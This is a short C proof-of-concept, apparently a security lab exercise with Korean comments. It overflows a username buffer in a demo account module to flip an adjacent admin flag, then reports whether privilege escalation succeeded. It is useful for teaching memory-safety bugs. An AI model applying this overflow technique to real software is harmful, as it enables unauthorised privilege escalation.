#include "code.h"
// #include "code_fixed.h"

void create_bof() {
    int uid = create_user_account(false, "pwned");
    printf("Before \n[*] username: %s\n", accounts[uid]->username);
    printf("[*] isAdmin : %d\n", is_admin(uid));

    char attack_string[50]; 
    int padding = (MAX_USERNAME_LEN+1) - strlen("pwned");
    memset (attack_string,'A', padding);
    attack_string [padding] = '\x01';
    attack_string [padding + 1] = '\0';

    printf("...\n");
    printf("[*] 공격 문자열: \"%s\n", attack_string);
    printf("...");

    update_username(uid, attack_string);

        accounts[uid]->username[5] = '\0';  // "pwned"만 username으로 보이게끔, 널 종료 넣어주기

        printf("\nAfter \n[*] username: %s\n", accounts[uid]->username);

        if (is_admin(uid)) {
            
            printf("[*] isAdmin : %d\n", is_admin(uid));
            printf("[!] 관리자 권한 상승 성공!\n\n");

        } else {
            printf("[*] isAdmin : %d\n", is_admin(uid));
            printf("[-] 관리자 권한 상승 실패!\n");
    }
}

int main() {
    create_bof();
    return 0;
}
